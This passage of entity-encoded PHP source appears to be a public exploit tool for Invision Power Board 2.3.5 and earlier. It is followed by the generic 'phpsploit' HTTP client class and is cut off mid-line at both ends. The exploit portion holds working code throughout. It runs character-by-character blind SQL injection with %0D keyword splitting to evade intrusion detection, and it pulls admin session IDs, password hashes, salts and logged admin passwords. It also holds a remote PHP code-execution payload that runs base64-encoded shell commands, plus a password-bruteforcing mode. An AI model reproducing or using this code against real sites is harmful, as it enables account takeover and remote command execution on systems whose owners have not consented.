&#123; # If no value, take the default one $this-&gt;get_conf&#40;'t.conf_value'&#41;; $this-&gt;get_conf&#40;'t.conf_default'&#41;; return; &#125; function get_conf&#40;$field&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_table = 'conf_settings'; $this-&gt;t_field = $field; $this-&gt;t_char = $this-&gt;chr_num; $this-&gt;t_add_0 = &quot;AND t.conf_key='match_browser'&quot;; if&#40; $this-&gt;conf&#91;'browser'&#93; === '' &#41; $this-&gt;conf&#91;'browser'&#93; = $this-&gt;bf_inj&#40;&#41;; $this-&gt;t_add_0 = &quot;AND t.conf_key='match_ipaddress'&quot;; if&#40; $this-&gt;conf&#91;'ip'&#93; === '' &#41; $this-&gt;conf&#91;'ip'&#93; = $this-&gt;bf_inj&#40;&#41;; $this-&gt;t_add_0 = &quot;AND t.conf_key='xforward_matching'&quot;; if&#40; $this-&gt;conf&#91;'xforward'&#93; === '' &#41; $this-&gt;conf&#91;'xforward'&#93; = $this-&gt;bf_inj&#40;&#41;; return; &#125; function get_login_key&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'login_key'; $this-&gt;t_table = 'members'; $this-&gt;t_field = 't.member_login_key'; $this-&gt;t_join = 't.id=m.id'; $this-&gt;t_char = $this-&gt;chr_md5; $this-&gt;data&#91;'login_key'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_sql_user&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'user&#40;&#41;'; $this-&gt;t_table = 'members'; $this-&gt;t_field = 'user&#40;&#41;'; $this-&gt;t_char = $this-&gt;chr_all; $this-&gt;t_end = '@'; $this-&gt;data&#91;'sql_user'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_pass_hash&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'pass_hash'; $this-&gt;t_table = 'members_converge'; $this-&gt;t_field = 't.converge_pass_hash'; $this-&gt;t_join = 't.converge_email=m.email'; $this-&gt;t_char = $this-&gt;chr_md5; $this-&gt;data&#91;'pass_hash'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_pass_salt&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'pass_salt'; $this-&gt;t_table = 'members_converge'; $this-&gt;t_field = 't.converge_pass_salt'; $this-&gt;t_join = 't.converge_email=m.email'; $this-&gt;t_char = $this-&gt;chr_all; $this-&gt;data&#91;'pass_salt'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_admin_sess&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'admin_sid'; $this-&gt;t_table = 'admin_sessions'; $this-&gt;t_field = 't.session_id'; $this-&gt;t_join = 't.session_member_id=m.id'; $this-&gt;t_sel = 't.session_log_in_time'; $this-&gt;t_char = $this-&gt;chr_md5; $this-&gt;data&#91;'a_sess_id'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_admin_ip&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'admin_ip'; $this-&gt;t_table = 'admin_sessions'; $this-&gt;t_field = 't.session_ip_address'; $this-&gt;t_join = 't.session_member_id=m.id'; $this-&gt;t_sel = 't.session_log_in_time'; $this-&gt;t_char = $this-&gt;chr_ip; $this-&gt;data&#91;'a_ip_addr'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_admin_pwd&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'admin_pwd'; $this-&gt;t_table = 'admin_login_logs'; $this-&gt;t_field = 't.admin_post_details'; $this-&gt;t_join = 't.admin_username=m.members_l_username'; $this-&gt;t_sel = 't.admin_id'; $this-&gt;t_end = '&quot;'; $this-&gt;t_bchar = -4; # &quot;;&#125;&#125; $this-&gt;t_char = $this-&gt;chr_all; $this-&gt;data&#91;'a_pwd_like'&#93;= $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_user_sess&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'user_sid'; $this-&gt;t_table = 'sessions'; $this-&gt;t_field = 't.id'; $this-&gt;t_join = 't.member_id=m.id'; $this-&gt;t_sel = 't.running_time'; $this-&gt;t_char = $this-&gt;chr_md5; $this-&gt;data&#91;'u_sess_id'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_user_ip&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'user_ip'; $this-&gt;t_table = 'sessions'; $this-&gt;t_field = 't.ip_address'; $this-&gt;t_join = 't.member_id=m.id'; $this-&gt;t_sel = 't.running_time'; $this-&gt;t_char = $this-&gt;chr_ip; $this-&gt;data&#91;'u_ip_addr'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function get_user_agent&#40;&#41; &#123; $this-&gt;init_sql&#40;&#41;; $this-&gt;t_key = 'user_agent'; $this-&gt;t_table = 'sessions'; $this-&gt;t_field = 't.browser'; $this-&gt;t_join = 't.member_id=m.id'; $this-&gt;t_sel = 't.running_time'; $this-&gt;t_char = $this-&gt;chr_all; $this-&gt;data&#91;'u_agent'&#93; = $this-&gt;bf_inj&#40;&#41;; return $this-&gt;key_val; &#125; function init_sql&#40;&#41; &#123; # SQL Injection params $this-&gt;t_end = null; $this-&gt;t_add_0 = ''; $this-&gt;t_add_1 = ''; $this-&gt;t_sel = '1'; $this-&gt;t_bchar = 0; $this-&gt;t_join = ''; $this-&gt;t_key = ''; $this-&gt;t_add_1 = 'ORDER BY id DESC LIMIT 1'; return; &#125; function init_global&#40;&#41; &#123; # Charsets $this-&gt;chr_spe = str_split&#40;' :/;*&#40;-.!,?В§*ВµГ№%$ВЈ^ВЁ=+&#125;&#41;В°&#93;Г Г§^_\\`ГЁ|&#91;\'&#123;#Г©~&amp;ВІ&quot;@'&#41;; $this-&gt;chr_num = range&#40;0, 9&#41;; $this-&gt;chr_md5 = array_merge&#40; $this-&gt;chr_num, range&#40;'a', 'f'&#41; &#41;; $this-&gt;chr_ip = array_merge&#40; $this-&gt;chr_num, array&#40;'.'&#41; &#41;; $this-&gt;chr_all = array_merge&#40; $this-&gt;chr_num, range&#40;'a', 'z'&#41; &#41;; $this-&gt;chr_all = array_merge&#40; range&#40;'A', 'Z'&#41;, $this-&gt;chr_all, $this-&gt;chr_spe &#41;; # SQL Injection $this-&gt;def_param = 'index.php?s=&amp;act=xmlout&amp;do=check-display-name&amp;name=%rep_inj%'; # IDS Evasion via %0D $this-&gt;def_inj = &quot;' OR 1=\&quot;'\&quot; U%0DNION %rep_req% OR 1=\&quot;'\&quot; %rep_add% #&quot;; # Results $this-&gt;data = array&#40;&#41;; $this-&gt;conf = array&#40;'ip' =&gt; '', 'browser' =&gt; '', 'xforward' =&gt; ''&#41;; # Misc $this-&gt;stat = array&#40;-1 =&gt; '-', 0 =&gt; '/', 1 =&gt; '+'&#41;; $this-&gt;s_bypass = false; $this-&gt;res_sep = md5&#40;rand&#40;&#41;&#41;; $this-&gt;def_ip = rand&#40;0,255&#41;.'.'.rand&#40;0,255&#41;.'.'.rand&#40;0,255&#41;.'.'.rand&#40;0,255&#41;; # PHP Code $this-&gt;php_write = '$&#123;$&#123;@eval&#40;$_SERVER&#91;HTTP_MY_CODE&#93;&#41;&#125;&#125;'; $this-&gt;php_send = &quot;print&#40;'$this-&gt;res_sep'&#41;;@system&#40;base64_decode&#40;'%CMD%'&#41;&#41;;&quot;; $this-&gt;php_send .= &quot;print&#40;'$this-&gt;res_sep'&#41;;exit&#40;0&#41;;&quot;; # Regex $this-&gt;reg_lang = '#&lt;/span&gt;&lt;/td&gt;&#91;\r\n&#93;*.*&#91;\r\n&#93;*.*code=export&amp;id=&#40;&#91;0-9&#93;+&#41;#i'; $this-&gt;reg_lvar = &quot;#id='XX_&#40;&#91;\w&#93;+&#41;'&#91;\x20&#93;+class='multitext'&gt;&#40;.*&#41;&lt;/textarea&gt;&lt;/td&gt;#i&quot;; $this-&gt;reg_cpre = '#^&#40;.*&#41;session_id$#'; # $this-&gt;reg_acp = '#&lt;a href=&quot;&#40;.*&#41;&quot;&#91;\x20&#93;+target=&quot;_blank&quot;#i'; # Default client headers $this-&gt;s_agent = 'Mozilla Firefox'; $this-&gt;s_ip = $this-&gt;def_ip; return; &#125; function bf_inj&#40;&#41; &#123; $this-&gt;sub_chr = $this-&gt;t_bchar; $this-&gt;key_val = ''; if&#40; !empty&#40;$this-&gt;t_key&#41; &#41; $this-&gt;msg&#40;'', 0&#41;; while&#40; true &#41; &#123; if&#40; $this-&gt;t_bchar &lt; 0 &#41; $this-&gt;sub_chr--; else $this-&gt;sub_chr++; # 0-9a-f for&#40; $j=0;$j&lt;=count&#40;$this-&gt;t_char&#41;;$j++ &#41; &#123; # That one ? $chr = $this-&gt;t_char&#91;$j&#93;; # Latest char ? if&#40; $j === count&#40;$this-&gt;t_char&#41; &#41; $chr = $this-&gt;t_end; # Ascii num $asc = ord&#40;$chr&#41;; # Screen bug if&#40; !empty&#40;$this-&gt;t_key&#41; &#41; &#123; $msg = $this-&gt;t_key.'='.$this-&gt;key_val; $msg .= &#40;$chr === $this-&gt;t_end ? &quot;\x20&quot; : $chr&#41;; $this-&gt;msg&#40;$msg, 0, 1, 1&#41;; &#125; # Focus on the target ? if&#40; !empty&#40;$this-&gt;t_join&#41; &#41; &#123; $inj = 'SEL%0DECT 1,'.$this-&gt;t_sel.' FR%0DOM '.$this-&gt;p_pre.$this-&gt;t_table. ' t, '.$this-&gt;p_pre.'members m WH%0DERE '.$this-&gt;t_join. ' AND m.'.$this-&gt;t_on.' AND ASC%0DII&#40;SUBS%0DTR&#40;'.$this-&gt;t_field. ','.$this-&gt;sub_chr.',1&#41;&#41;='.$asc.' '.$this-&gt;t_add_0; &#125; else &#123; $inj = 'SEL%0DECT 1,'.$this-&gt;t_sel.' FR%0DOM '.$this-&gt;p_pre.$this-&gt;t_table. ' t WH%0DERE ASC%0DII&#40;SUB%0DSTR&#40;'.$this-&gt;t_field.','.$this-&gt;sub_chr. ',1&#41;&#41;='.$asc.' '.$this-&gt;t_add_0; &#125; # SQL Injection via rawurldecode&#40;&#41; $inj = str_replace&#40;'%rep_req%', $inj, $this-&gt;def_inj&#41;; $inj = str_replace&#40;'%rep_add%', $this-&gt;t_add_1, $inj&#41;; $inj = str_replace&#40;array&#40;'&quot;', &quot;'&quot;&#41;, array&#40;'%2522', '%2527'&#41;, $inj&#41;; # Params $inj = str_replace&#40;'%rep_inj%', $inj, $this-&gt;def_param&#41;; $inj = str_replace&#40;array&#40;' ', '#'&#41;, array&#40;'%20', '%23'&#41;, $inj&#41;; $this-&gt;web-&gt;get&#40;$this-&gt;p_url.$inj&#41;; # Ok !? if&#40; !strstr&#40;$this-&gt;web-&gt;getcontent&#40;&#41;, 'notfound'&#41; &#41; &#123; if&#40; $chr !== $this-&gt;t_end &#41; &#123; $this-&gt;key_val .= $chr; break; &#125; &#125; # End if&#40; $chr === $this-&gt;t_end &#41; &#123; # Reverse if&#40; $this-&gt;t_bchar &lt; 0 &#41; $this-&gt;key_val = strrev&#40;$this-&gt;key_val&#41;; if&#40; !empty&#40;$this-&gt;t_key&#41; &#41; $this-&gt;msg&#40;$this-&gt;t_key.'='.$this-&gt;key_val, 1, 1, 1&#41;; return $this-&gt;key_val; &#125; &#125; &#125; &#125; function get_p&#40;$p, $exit=false&#41; &#123; global $argv; foreach&#40; $argv as $key =&gt; $value &#41; &#123; if&#40; $value === '-'.$p &#41; &#123; if&#40; isset&#40;$argv&#91;$key+1&#93;&#41; &amp;&amp; !empty&#40;$argv&#91;$key+1&#93;&#41; &#41; &#123; return $argv&#91;$key+1&#93;; &#125; else &#123; if&#40; $exit &#41; $this-&gt;usage&#40;&#41;; return true; &#125; &#125; &#125; if&#40; $exit &#41; $this-&gt;usage&#40;&#41;; return false; &#125; function msg&#40;$msg, $nstatus, $nspace=1, $ndel=0, $ask=false&#41; &#123; if&#40; $ndel &#41; $type = &quot;\r&quot;; else $type = &quot;\n&quot;; # wtf &#40;: print &#40; $type.str_repeat&#40;&quot;\x20&quot;, $nspace&#41;. $this-&gt;stat&#91;$nstatus&#93;.&quot;\x20&quot;.$msg &#41;; if&#40; $ask &#41; return trim&#40;fgets&#40;STDIN&#41;&#41;; &#125; function give_hope&#40;&#41; &#123; $this-&gt;msg&#40;'You should try with another user or try another time', -1&#41;; exit&#40;1&#41;; &#125; function mhead&#40;&#41; &#123; # Advisory: http://acid-root.new.fr/?0:18 print &quot;\n Invision Power Board &lt;= 2.3.5 Multiple Vulnerabilities&quot;; print &quot;\n ------------------------------------------------------&quot;; print &quot;\n\n About:&quot;; print &quot;\n\n by DarkFig &lt; gmdarkfig &#40;at&#41; gmail &#40;dot&#41; com &gt;&quot;; print &quot;\n http://acid-root.new.fr/&quot;; print &quot;\n #acidroot@irc.worldnet.net&quot;; print &quot;\n\n\n Attack&#40;s&#41;:\n&quot;; return; &#125; function usage&#40;&#41; &#123; print &quot;\n -attack &lt;int_choice&gt; &lt;params&gt; &#91;options&#93;\n\n&quot;; print &quot; 1 - PHP code execution\n\n&quot;; print &quot; -url IPB url with ending slash\n\n&quot;; print &quot; -uname targeted username\n&quot;; print &quot; -uid OR the targeted user id &#40;def: 1&#41;\n\n&quot;; print &quot; -prefix sql table prefix &#40;def: ibf_&#41;\n&quot;; print &quot; -acp admin control panel path &#40;def: admin&#41;\n\n\n&quot;; print &quot; 2 - Insecure SQL password usage\n\n&quot;; print &quot; -ip your current IP\n&quot;; print &quot; -dict a wordlist file\n\n&quot;; print &quot; -url IPB url with ending slash\n&quot;; print &quot; -uname a valid member username\n&quot;; print &quot; -pwd the associated password\n\n&quot;; print &quot; -uid OR the targeted member id\n&quot;; print &quot; -passhash the passhash cookie value\n&quot;; print &quot; -stronghold the stronghold cookie value\n\n&quot;; print &quot; -sqlusr you can precise the sql user\n&quot;; print &quot; -prefix sql table prefix &#40;def: ibf_&#41;\n\n\n&quot;; print &quot; 3 - Password bruteforcer\n\n&quot;; print &quot; -dict a wordlist file\n\n&quot;; print &quot; -url IPB url with ending slash\n&quot;; print &quot; -uname targeted username\n&quot;; print &quot; -uid OR the targeted user id &#40;def: 1&#41;\n&quot;; print &quot; -prefix sql table prefix &#40;def: ibf_&#41;\n\n&quot;; print &quot; -passhash OR the passhash value\n&quot;; print &quot; -salt the salt value\n\n\n&quot;; print &quot; Optional: \n\n&quot;; print &quot; -proxhost &lt;ip&gt; if you wanna use a proxy\n&quot;; print &quot; -proxauth &lt;usr:pwd&gt; proxy with authentication\n&quot;; exit&#40;1&#41;; &#125; &#125; /* * * Copyright &#40;C&#41; darkfig * * This program is free software; you can redistribute it and/or * modify it under the terms of the GNU General Public License * as published by the Free Software Foundation; either version 2 * of the License, or &#40;at your option&#41; any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program; if not, write to the Free Software * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA. * * TITLE: PhpSploit Class * REQUIREMENTS: PHP 4 / PHP 5 * VERSION: 2.1 * LICENSE: GNU General Public License * ORIGINAL URL: http://www.acid-root.new.fr/tools/03061230.txt * FILENAME: phpsploitclass.php * * CONTACT: gmdarkfig@gmail.com &#40;french / english&#41; * GREETZ: Sparah, Ddx39 * * DESCRIPTION: * The phpsploit is a class implementing a web user agent. * You can add cookies, headers, use a proxy server with &#40;or without&#41; a * basic authentification. It supports the GET and the POST method. It can * also be used like a browser with the cookiejar&#40;&#41; function &#40;which allow * a server to add several cookies for the next requests&#41; and the * allowredirection&#40;&#41; function &#40;which allow the script to follow all * redirections sent by the server&#41;. It can return the content &#40;or the * headers&#41; of the request. Others useful functions can be used for debugging. * A manual is actually in development but to know how to use it, you can * read the comments. * * CHANGELOG: * * &#91;2008-08-29&#93; &#40;2.1&#41; * * New: The showheader&#40;&#41;/showcookie&#40;&#41; functions can now return an array * * Bug #3 fixed: Problem concerning some servers for the main function * * &#91;2007-06-10&#93; &#40;2.0&#41; * * Code: Code optimization * * New: Compatible with PHP 4 by default * * &#91;2007-01-24&#93; &#40;1.2&#41; * * Bug #2 fixed: Problem concerning the getcookie&#40;&#41; function &#40;&#40;|;&#41;&#41; * * New: multipart/form-data enctype is now supported * * &#91;2006-12-31&#93; &#40;1.1&#41; * * Bug #1 fixed: Problem concerning the allowredirection&#40;&#41; function &#40;chr&#40;13&#41; bug&#41; * * New: You can now call the getheader&#40;&#41; / getcontent&#40;&#41; function without parameters * * &#91;2006-12-30&#93; &#40;1.0&#41; * * First version * */ class phpsploit &#123; var $proxyhost; var $proxyport; var $host; var $path; var $port; var $method; var $url; var $packet; var $proxyuser; var $proxypass; var $header; var $cookie; var $data; var $boundary; var $allowredirection; var $last_redirection; var $cookiejar; var $recv; var $cookie_str; var $header_str; var $server_content; var $server_header; /** * This function is called by the * get&#40;&#41;/post&#40;&#41;/formdata&#40;&#41; functions. * You don't have to call it, this is * the main function. * * @access private * @return string $this-&gt;recv ServerResponse * */ function sock&#40;&#41; &#123; if&#40;!empty&#40;$this-&gt;proxyhost&#41; &amp;&amp; !empty&#40;$this-&gt;proxyport&#41;&#41; $socket = @fsockopen&#40;$this-&gt;proxyhost,$this-&gt;proxyport&#41;; else $socket = @fsockopen&#40;$this-&gt;host,$this-&gt;port&#41;; if&#40;!$socket&#41; die&#40;&quot;Error: Host seems down&quot;&#41;; if&#40;$this-&gt;method=='get'&#41; $this-&gt;packet = 'GET '.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;; elseif&#40;$this-&gt;method=='post' or $this-&gt;method=='formdata'&#41; $this-&gt;packet = 'POST '.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;; else die&#40;&quot;Error: Invalid method&quot;&#41;; if&#40;!empty&#40;$this-&gt;proxyuser&#41;&#41; $this-&gt;packet .= 'Proxy-Authorization: Basic '.base64_encode&#40;$this-&gt;proxyuser.':'.$this-&gt;proxypass&#41;.&quot;\r\n&quot;; if&#40;!empty&#40;$this-&gt;header&#41;&#41; $this-&gt;packet .= $this-&gt;showheader&#40;&#41;; if&#40;!empty&#40;$this-&gt;cookie&#41;&#41; $this-&gt;packet .= 'Cookie: '.$this-&gt;showcookie&#40;&#41;.&quot;\r\n&quot;; $this-&gt;packet .= 'Host: '.$this-&gt;host.&quot;\r\n&quot;; $this-&gt;packet .= &quot;Connection: Close\r\n&quot;; if&#40;$this-&gt;method=='post'&#41; &#123; $this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;; $this-&gt;packet .= 'Content-Length: '.strlen&#40;$this-&gt;data&#41;.&quot;\r\n\r\n&quot;; $this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;; &#125; elseif&#40;$this-&gt;method=='formdata'&#41; &#123; $this-&gt;packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat&#40;'-',27&#41;.$this-&gt;boundary.&quot;\r\n&quot;; $this-&gt;packet .= 'Content-Length: '.strlen&#40;$this-&gt;data&#41;.&quot;\r\n\r\n&quot;; $this-&gt;packet .= $this-&gt;data; &#125; $this-&gt;packet .= &quot;\r\n&quot;; $this-&gt;recv = ''; fputs&#40;$socket, $this-&gt;packet&#41;; while&#40;!feof&#40;$socket&#41;&#41; $this-&gt;recv .= fgets&#40;$socket&#41;; fclose&#40;$socket&#41;; if&#40;$this-&gt;cookiejar&#41; $this-&gt;getcookie&#40;&#41;; if&#40;$this-&gt;allowredirection&#41; return $this-&gt;getredirection&#40;&#41;; else return $this-&gt;recv; &#125; /** * This function allows you to add several * cookies in the request. * * @access public * @param string cookn CookieName * @param string cookv CookieValue * @example $this-&gt;addcookie&#40;'name','value'&#41; * */ function addcookie&#40;$cookn,$cookv&#41; &#123; if&#40;!isset&#40;$this-&gt;cookie&#41;&#41; $this-&gt;cookie = array&#40;&#41;; $this-&gt;cookie&#91;$cookn&#93; = $cookv; &#125; /** * This function allows you to add several * headers in the request. * * @access public * @param string headern HeaderName * @param string headervalue Headervalue * @example $this-&gt;addheader&#40;'Client-IP', '128.5.2.3'&#41; * */ function addheader&#40;$headern,$headervalue&#41; &#123; if&#40;!isset&#40;$this-&gt;header&#41;&#41; $this-&gt;header = array&#40;&#41;; $this-&gt;header&#91;$headern&#93; = $headervalue; &#125; /** * This function allows you to use an * http proxy server. Several methods * are supported. * * @access public * @param string proxy ProxyHost * @param integer proxyp ProxyPort * @example $this-&gt;proxy&#40;'localhost',8118&#41; * @example $this-&gt;proxy&#40;'localhost:8118'&#41; * */ function proxy&#40;$proxy,$proxyp=''&#41; &#123; if&#40;empty&#40;$proxyp&#41;&#41; &#123; $proxarr = explode&#40;':',$proxy&#41;; $this-&gt;proxyhost = $proxarr&#91;0&#93;; $this-&gt;proxyport = &#40;int&#41;$proxarr&#91;1&#93;; &#125; else &#123; $this-&gt;proxyhost = $proxy; $this-&gt;proxyport = &#40;int&#41;$proxyp; &#125; if&#40;$this-&gt;proxyport &gt; 65535&#41; die&#40;&quot;Error: Invalid port number&quot;&#41;; &#125; /** * This function allows you to use an * http proxy server which requires a * basic authentification. Several * methods are supported: * * @access public * @param string proxyauth ProxyUser * @param string proxypass ProxyPass * @example $this-&gt;proxyauth&#40;'user','pwd'&#41; * @example $this-&gt;proxyauth&#40;'user:pwd'&#41;; * */ function proxyauth&#40;$proxyauth,$proxypass=''&#41; &#123; if&#40;empty&#40;$proxypass&#41;&#41; &#123; $posvirg = strpos&#40;$proxyauth,':'&#41;; $this-&gt;proxyuser = substr&#40;$proxyauth,0,$posvirg&#41;; $this-&gt;proxypass = substr&#40;$proxyauth,$posvirg+1&#41;; &#125; else &#123; $this-&gt;proxyuser = $proxyauth; $this-&gt;proxypass = $proxypass; &#125; &#125; /** * This function allows you to set * the 'User-Agent' header. * * @access public * @param string useragent Agent * @example $this-&gt;agent&#40;'Firefox'&#41; * */ function agent&#40;$useragent&#41; &#123; $this-&gt;addheader&#40;'User-Agent',$useragent&#41;; &#125; /** * This function returns the headers * which will be in the next request. * * @access public * @return string $this-&gt;header_str Headers * @return array $this-&gt;head Headers * @example $this-&gt;showheader&#40;&#41; * @example $this-&gt;showheader&#40;1&#41; * */ function showheader&#40;$array=''&#41; &#123; $this-&gt;header_str = ''; if&#40;!isset&#40;$this-&gt;header&#41;&#41; return; if&#40;!empty&#40;$array&#41;&#41; return $this-&gt;header; foreach&#40;$this-&gt;header as $name =&gt; $value&#41; $this-&gt;header_str .= $name.': '.$value.&quot;\r\n&quot;; return $this-&gt;header_str; &#125; /** * This function returns the cookies * which will be in the next request. * * @access public * @return string $this-&gt;cookie_str Cookies * @return array $this-&gt;cookie Cookies * @example $this-&gt;showcookie&#40;&#41; * @example $this-&gt;showcookie&#40;1&#41; * */ function showcookie&#40;$array=''&#41; &#123; if&#40;!isset&#40;$this-&gt;cookie&#41;&#41; return; if&#40;!empty&#40;$array&#41;&#41; return $this-&gt;cookie; $this-&gt;cookie_str = ''; foreach&#40;$this-&gt;cookie as $name =&gt; $value&#41; $this-&gt;cookie_str .= $name.'='.$value.'; '; return $this-&gt;cookie_str; &#125; /** * This function returns the last * formed http request. * * @access public * @return string $this-&gt;packet HttpPacket * @example $this-&gt;showlastrequest&#40;&#41; * */ function showlastrequest&#40;&#41; &#123; if&#40;!isset&#40;$this-&gt;packet&#41;&#41; return; else return $this-&gt;packet; &#125; /** * This function sends the formed * http packet with the GET method. * * @access public * @param string url Url * @return string $this-&gt;sock&#40;&#41; * @example $this-&gt;get&#40;'localhost/index.php?var=x'&#41; * @example $this-&gt;get&#40;'http://localhost:88/tst.php'&#41; * */ function get&#40;$url&#41; &#123; $this-&gt;target&#40;$url&#41;; $this-&gt;method = 'get'; return $this-&gt;sock&#40;&#41;; &#125; /** * This function sends the formed * http packet with the POST method. * * @access public * @param string url Url * @param string data PostData * @return string $this-&gt;sock&#40;&#41; * @example $this-&gt;post&#40;'http://localhost/','helo=x'&#41; * */ function post&#40;$url,$data&#41; &#123; $this-&gt;target&#40;$url&#41;; $this-&gt;method = 'post'; $this-&gt;data = $data; return $this-&gt;sock&#40;&#41;; &#125; /** * This function sends the formed http * packet with the POST method using * the multipart/form-data enctype. * * @access public * @param array array FormDataArray * @return string $this-&gt;sock&#40;&#41; * @example $formdata = array&#40; * frmdt_url =&gt; 'http://localhost/upload.php', * frmdt_boundary =&gt; '123456', # Optional * 'var' =&gt; 'example', * 'file' =&gt; array&#40; * frmdt_type =&gt; 'image/gif', # Optional * frmdt_transfert =&gt; 'binary' # Optional * frmdt_filename =&gt; 'hello.php, * frmdt_content =&gt; '&lt;?php echo 1; ?&gt;'&#41;&#41;; * $this-&gt;formdata&#40;$formdata&#41;; * */ function formdata&#40;$array&#41; &#123; $this-&gt;target&#40;$array&#91;frmdt_url&#93;&#41;; $this-&gt;method = 'formdata'; $this-&gt;data = ''; if&#40;!isset&#40;$array&#91;frmdt_boundary&#93;&#41;&#41; $this-&gt;boundary = 'phpsploit'; else $this-&gt;boundary = $array&#91;frmdt_boundary&#93;; foreach&#40;$array as $key =&gt; $value&#41; &#123; if&#40;!preg_match&#40;'#^frmdt_&#40;boundary|url&#41;#',$key&#41;&#41; &#123; $this-&gt;data .= str_repeat&#40;'-',29&#41;.$this-&gt;boundary.&quot;\r\n&quot;; $this-&gt;data .= 'Content-Disposition: form-data; name=&quot;'.$key.'&quot;;'; if&#40;!is_array&#40;$value&#41;&#41; &#123; $this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;; &#125; else &#123; $this-&gt;data .= ' filename=&quot;'.$array&#91;$key&#93;&#91;frmdt_filename&#93;.&quot;\&quot;;\r\n&quot;; if&#40;isset&#40;$array&#91;$key&#93;&#91;frmdt_type&#93;&#41;&#41; $this-&gt;data .= 'Content-Type: '.$array&#91;$key&#93;&#91;frmdt_type&#93;.&quot;\r\n&quot;; if&#40;isset&#40;$array&#91;$key&#93;&#91;frmdt_transfert&#93;&#41;&#41; $this-&gt;data .= 'Content-Transfer-Encoding: '.$array&#91;$key&#93;&#91;frmdt_transfert&#93;.&quot;\r\n&quot;; $this-&gt;data .= &quot;\r\n&quot;.$array&#91;$key&#93;&#91;frmdt_content&#93;.&quot;\r\n&quot;; &#125; &#125; &#125; $this-&gt;data .= str_repeat&#40;'-',29&#41;.$this-&gt;boundary.&quot;--\r\n&quot;; return $this-&gt;sock&#40;&#41;; &#125; /** * This function returns the content * of the server response, without * the headers. * * @access public * @param string code ServerResponse * @return string $this-&gt;server_content * @example $this-&gt;getcontent&#40;&#41; * @example $this-&gt;getcontent&#40;$this-&gt;get&#40;'http://localhost/'&#41;&#41; * */ function getcontent&#40;$code=''&#41; &#123; if&#40;empty&#40;$code&#41;&#41; $code = $this-&gt;recv; $code = explode&#40;&quot;\r\n\r\n&quot;,$code&#41;; $this-&gt;server_content = ''; for&#40;$i=1;$i&lt;count&#40;$code&#41;;$i++&#41; $this-&gt;server_content .= $code&#91;$i&#93;; return $this-&gt;server_content; &#125; /** * This function returns the headers * of the server response, without * the content. * * @access public * @param string code ServerResponse * @return string $this-&gt;server_header * @example $this-&gt;getcontent&#40;&#41; * @example $this-&gt;getcontent&#40;$this-&gt;post&#40;'http://localhost/','1=2'&#41;&#41; * */ function getheader&#40;$code=''&#41; &#123; if&#40;empty&#40;$code&#41;&#41; $code = $this-&gt;recv; $code = explode&#40;&quot;\r\n\r\n&quot;,$code&#41;; $this-&gt;server_header = $code&#91;0&#93;; return $this-&gt;server_header; &#125; /** * This function is called by the * cookiejar&#40;&#41; function. It adds the * value of the &quot;Set-Cookie&quot; header * in the &quot;Cookie&quot; header for the * next request. You don't have to * call it. * * @access private * @param string code ServerResponse * */ function getcookie&#40;&#41; &#123; foreach&#40;explode&#40;&quot;\r\n&quot;,$this-&gt;getheader&#40;&#41;&#41; as $header&#41; &#123; if&#40;preg_match&#40;'/set-cookie/i',$header&#41;&#41; &#123; $fequal = strpos&#40;$header,'='&#41;; $fvirgu = strpos&#40;$header,';'&#41;; // 12=strlen&#40;'set-cookie: '&#41; $cname = substr&#40;$header,12,$fequal-12&#41;; $cvalu = substr&#40;$header,$fequal+1,$fvirgu-&#40;strlen&#40;$cname&#41;+12+1&#41;&#41;; $this-&gt;cookie&#91;trim&#40;$cname&#41;&#93; = trim&#40;$cvalu&#41;; &#125; &#125; &#125; /** * This function is called by the * get&#40;&#41;/post&#40;&#41; functions. You * don't have to call it. * * @access private * @param string urltarg Url * @example $this-&gt;target&#40;'http://localhost/'&#41; * */ function target&#40;$urltarg&#41; &#123; if&#40;!ereg&#40;'^http://',$urltarg&#41;&#41; $urltarg = 'http://'.$urltarg; $urlarr = parse_url&#40;$urltarg&#41;; if&#40;!isset&#40;$urlarr&#91;'path'&#93;&#41; |empty&#40;$urlarr&#91;'path'&#93;&#41;&#41; die&#40;&quot;Error: No path precised&quot;&#41;; $this-&gt;url = $urlarr&#91;'path'&#93;; if&#40;isset&#40;$urlarr&#91;'query'&#93;&#41;&#41; $this-&gt;url .= '?'.$urlarr&#91;'query'&#93;; $this-&gt;port = !empty&#40;$urlarr&#91;'port'&#93;&#41; ? $urlarr&#91;'port'&#93; : 80; $this-&gt;host = $urlarr&#91;'host'&#93;; if&#40;$this-&gt;port != '80'&#41; $this-&gt;host .= 